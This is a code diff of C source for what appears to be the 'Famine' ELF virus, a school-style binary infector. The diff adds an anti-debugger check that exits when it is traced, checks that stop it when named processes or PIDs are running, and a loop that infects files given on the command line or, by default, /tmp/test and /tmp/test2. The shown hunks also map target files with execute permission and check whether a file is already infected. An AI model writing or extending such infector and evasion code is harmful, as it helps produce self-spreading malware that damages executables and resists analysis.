@@ -49,7 +49,7 @@ int		processing(char *ptr, size_t size, char *path, int fd)
 {
 	unsigned int	magic_number;
 	unsigned int	elf_magic_number;
-	
+
 	message = "face a la patate, tout est possible #Famine (jucapik)";
 	if (check_copy(ptr, size))
 		return (error("File already infected - "));
@@ -86,7 +86,7 @@ int		infect(char *path)
 		return (1);
 	}
 	if ((ptr = mmap(0, buf.st_size, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE, fd, 0))
-		== MAP_FAILED)
+			== MAP_FAILED)
 		return (error("mmap failed\n"));
 	if (processing(ptr, buf.st_size, path, fd))
 	{
@@ -102,22 +102,60 @@ int		infect(char *path)
 
 int		main(int ac, char **av)
 {
+	/////////////////////////////////////////////////////////////////////////////////////
+	//                                 PAS DE SORTIES                                  //
+	/////////////////////////////////////////////////////////////////////////////////////
 	//outputhandle(ac, av); //TODO: activate for the real thing
-	int pid = 0;
-	char *nom = "amwa";
-	printf(">.> (%d) for %d and %s\n", check_process(nom, pid), pid, nom);
-	if (ac <= 1)
+	/////////////////////////////////////////////////////////////////////////////////////
+	//                                 SCREW THE DEBUGGER                              //
+	/////////////////////////////////////////////////////////////////////////////////////
+	if (check_debuggeur() == 1)
+		exit(1);
+	/////////////////////////////////////////////////////////////////////////////////////
+	//                                 CHECK OTHER PROCESS                             //
+	/////////////////////////////////////////////////////////////////////////////////////
+	if (check_process("test", 0) == 0)
+	{
+		printf("cheh non\n");
+		exit(0);
+	}
+	for (int i = 1; i < ac; ++i)
+	{
+		if (strcmp("-ckppid", av[i]) == 0 || strcmp("--check-process-pid", av[i]) == 0
+				&& i + 1 < ac)
+		{
+			if (check_process(NULL, atoi(av[i + 1])) == 0)
+			{
+				printf("cheh non\n");
+				exit(0);
+			}
+		}
+		if (strcmp("-ckpname", av[i]) == 0 || strcmp("--check-process-name", av[i]) == 0
+				&& i + 1 < ac)
+		{
+			if (check_process(av[i + 1], 0) == 0)
+			{
+				printf("cheh non\n");
+				exit(0);
+			}
+		}
+	}
+	/////////////////////////////////////////////////////////////////////////////////////
+	//                                     INFECTION                                   //
+	/////////////////////////////////////////////////////////////////////////////////////
+	bool check = false;
+	for (int i = 1; i < ac; ++i)
+	{
+		if (strcmp("-i", av[i]) == 0 && i + 1 < ac)
+		{
+			check = true;
+			infect(av[i + 1]);
+		}
+	}
+	if (check == false)
 	{
 		infect("/tmp/test");
 		infect("/tmp/test2");
-	}
-	else
-	{
-		for (int i = 1; i < ac; ++i)
-		{
-			if (av[i][0] != '-')
-				infect(av[i]);
-		}
 	}
 	return (0);
 }
